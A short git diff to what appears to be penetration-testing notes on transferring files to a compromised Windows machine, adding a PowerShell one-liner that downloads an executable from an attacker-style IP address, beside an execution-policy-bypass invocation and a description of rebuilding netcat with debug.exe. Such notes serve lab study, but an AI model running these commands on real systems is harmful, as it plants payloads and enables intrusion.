@@ -128,6 +128,12 @@ Now we invoke it with this crazy syntax:
 powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File wget.ps1
 ```
 
+You can also use this command:
+
+```text
+(New-Object System.Net.WebClient).DownloadFile("http://10.10.14.15:8080/exe_files/test.exe", "C:\Users\Man\Documents\test.exe") 
+```
+
 ## Debug.exe
 
 This is a crazy technique that works on windows 32 bit machines. Basically the idea is to use the `debug.exe` program. It is used to inspect binaries, like a debugger. But it can also rebuild them from hex. So the idea is that we take a binaries, like `netcat`. And then disassemble it into hex, paste it into a file on the compromised machine, and then assemble it with `debug.exe`.
